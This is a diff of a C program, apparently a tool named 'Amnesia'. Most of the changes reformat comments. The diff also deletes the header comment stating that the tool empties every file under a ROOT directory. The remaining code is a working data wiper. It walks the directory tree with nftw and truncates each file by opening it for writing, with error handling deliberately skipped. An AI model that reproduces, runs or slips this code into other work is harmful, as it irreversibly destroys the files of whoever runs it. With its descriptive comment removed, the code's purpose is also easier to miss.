@@ -1,7 +1,7 @@
 /**
- *	The MIT License (MIT)
+ *  The MIT License (MIT)
  *
- *	Copyright (c) 2017 George G. Gkasdrogkas
+ *  Copyright (c) 2017 George Gkasdrogkas
  *
  *	Permission is hereby granted, free of charge, to any person obtaining a copy
  *	of this software and associated documentation files (the "Software"), to deal
@@ -22,35 +22,37 @@
  *  SOFTWARE.
  */
 
- /**
-  * -- Amnesia --
-  * Amnesia is a simple tool that clear the contents of all files
-  * which are located under ROOT. In other words the computer is like
-  * getting amnesia to it's files.
-  */
 #include "amnesia.h"
 
 static int nftwCallback(const char *fpath, const struct stat *sb, int tflag, struct FTW *ftwbuf) {
-	/**
-	 * If item is file then open it for binary writing, which
-	 * automatically clear all it's content.
-	 * We don't have to check for any errors ...we don't care.
-	 */
-    fopen(fpath, "wb"); 
-    usleep(200); /* Give the processor a small breath. */
-    return 0; /* Proceed to next item (file, folder, symbolic link, etc). */
+  /**
+   * If item is file then open it for binary writing, which
+   * automatically clear all it's content.
+   */
+  fopen(fpath, "wb"); 
+
+  /**
+    * Give the processor a small breath.
+    */
+  usleep(200);
+
+  /**
+   * Proceed to next item (file, folder, symbolic link, etc).
+   */
+  return 0;
 }
 
 int main() {
-	/**
-	 * nftw() walks through the directory tree that is located under the directory (ROOT), 
-	 * and calls nftwCallback() once for each entry in the tree. 
-	 * By default, directories are handled before the files and subdirectories 
-	 * they contain (preorder traversal). 
-	 * FTW_PHYS is passed as a flag. That allows us not to follow symbolic links.
-	 */
-    if (nftw(ROOT, nftwCallback, 20, FTW_PHYS) == -1) {
-    	perror("nftw");
-    }
-    return 0; /* We might face an error on nftw() but we don't care either.*/
+  /**
+   * nftw() walks through the directory tree that is located under the directory (ROOT), 
+   * and calls nftwCallback() once for each entry in the tree. 
+   * By default, directories are handled before the files and subdirectories 
+   * they contain (preorder traversal). 
+   * FTW_PHYS is passed as a flag. That allows us not to follow symbolic links.
+   */
+  if (nftw(ROOT, nftwCallback, 20, FTW_PHYS) == -1) {
+    perror("nftw");
+  }
+  
+  return 0;
 }
